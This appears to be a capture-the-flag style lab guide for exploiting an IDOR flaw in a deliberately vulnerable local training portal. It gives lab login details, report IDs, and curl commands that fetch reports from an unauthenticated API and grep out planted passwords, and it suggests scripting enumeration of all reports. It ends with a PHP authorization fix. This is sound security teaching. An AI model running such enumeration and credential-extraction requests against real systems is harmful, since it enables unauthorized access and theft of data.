# Quick IDOR Test Guide

## 🚀 Test the IDOR Vulnerability in 60 Seconds

### Step 1: Login to Portal
```
URL: http://portal.mbti.local
Username: MBTI2024837
Password: tekelomuxo
```

### Step 2: Navigate to Reports
Click "Reports" in the left sidebar (briefcase icon)

### Step 3: Exploit IDOR
See the "Direct Report Access" input field at the top?

**Try these report IDs:**
- Enter: `502` → Click "View" → 💥 **Password leaked!**
- Enter: `512` → Click "View" → 💥 **DB credentials & secrets!**

---

## 🎯 What You'll Find

### Report #502: Infrastructure Credentials
```
Development Server: dev.mbti-internal.local
Username: admin
Password: Mb7i_D3v_2024!Secure  ← 🔑 Target!
```

### Report #512: Executive Secrets
```
Production Database: prod-db.mbti-internal.local
Username: db_admin
Password: Pr0d_DB_M8t1#2025!Secure  ← 🔑 Target!

Plus:
- Executive salaries
- Layoff plans
- Merger negotiations (TOP SECRET)
```

---

## 🔍 Alternative Methods

### Using cURL (No Login Required!)
```bash
# Get report #502
curl "http://portal.mbti.local/api/reports.php?id=502" | jq .

# Get report #512
curl "http://portal.mbti.local/api/reports.php?id=512" | jq .

# Extract just the password from #502
curl -s "http://portal.mbti.local/api/reports.php?id=502" | \
  jq -r '.data.report_content' | grep "Password:"
```

### Using Browser DevTools
1. Open Reports page
2. Open DevTools (F12) → Network tab
3. Enter report ID 502 → Click View
4. See the API request: `GET /api/reports.php?id=502`
5. Notice: No authentication headers! 🚨

---

## ⚠️ Security Issues Demonstrated

1. **No Authentication**: API doesn't check if user is logged in
2. **No Authorization**: API doesn't check if user can access this specific report
3. **Sequential IDs**: Easy to guess (1, 2, 3, ..., 512)
4. **Confidential Flag Ignored**: `is_confidential` field exists but not enforced!

---

## 🎓 What This Teaches

- **IDOR Definition**: Direct access to objects without proper authorization
- **Real Impact**: Credential theft, data breach, privacy violations
- **Common Mistake**: Trusting client-side restrictions only
- **Fix Required**: Server-side authorization checks

---

## ✅ Success Criteria

You've successfully exploited IDOR if you can:
- [x] Access report #502 without being authorized
- [x] Read the leaked password: `Mb7i_D3v_2024!Secure`
- [x] Access report #512 (even more sensitive!)
- [x] Extract database credentials
- [x] Explain how to fix the vulnerability

---

## 🛠️ Bonus Challenges

1. **Enumerate All Reports**: Write a script to download all 512 reports
2. **Find All Confidential**: Filter only confidential reports (hint: 2 total)
3. **Explain Impact**: Document business impact of this breach
4. **Propose Fix**: Write secure code to patch this vulnerability

---

## 📝 Expected Fix

```php
// Add authentication check
if (!isset($_SESSION['logged_in']) || !$_SESSION['logged_in']) {
    http_response_code(401);
    echo json_encode(['error' => 'Unauthorized']);
    exit;
}

// Add authorization check
$stmt = $conn->prepare("
    SELECT * FROM weekly_reports 
    WHERE id = ? AND (
        employee_id = ? OR 
        is_confidential = FALSE OR
        ? IN (SELECT manager_id FROM employees WHERE employee_id = ?)
    )
");
$stmt->bind_param("isss", $report_id, $_SESSION['employee_id'], 
                  $_SESSION['employee_id'], $_SESSION['employee_id']);
```

---

**Ready? Go exploit the IDOR vulnerability! 🚀**

Time to start: **NOW!**
